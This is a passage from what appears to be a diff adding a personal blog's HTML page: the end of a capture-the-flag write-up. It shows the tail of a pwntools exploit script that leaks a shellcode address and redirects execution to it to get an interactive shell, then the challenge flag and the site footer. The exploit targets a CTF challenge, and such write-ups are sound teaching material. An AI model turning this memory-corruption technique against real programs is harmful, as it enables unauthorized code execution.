+shellcode_addr <span style="color:#f92672">=</span> int(sh<span style="color:#f92672">.</span>recvline()[<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>
+
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Jump to shellcode?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#75715e">#sh.recvline()</span>
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;c&#34;</span>)
+
+<span style="color:#75715e">#sh.recvuntil(&#34;Move?\n&gt; &#34;)</span>
+<span style="color:#75715e">#sh.sendline(&#34;old_school &#34;+p64(shellcode_addr)+&#34;\0\0&#34;)</span>
+<span style="color:#75715e">#sh.recvline()</span>
+shellcode_addr2 <span style="color:#f92672">=</span> int(sh<span style="color:#f92672">.</span>recvline()[<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">16</span>)
+
+<span style="color:#75715e">#sh.recvuntil(&#34;Jump to shellcode?\n&#34;)</span>
+<span style="color:#75715e">#sh.recvline()</span>
+<span style="color:#75715e">#sh.sendline(&#34;c&#34;)</span>
+
+<span style="color:#75715e">#gdb.attach(sh)</span>
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Move?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>)
+
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;last_ride &#34;</span><span style="color:#f92672">+</span>p64(shellcode_addr))
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>flag: <code>sun{the chair and thumbtacks are ready, but the roof is a little loose}</code></p>
+</div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
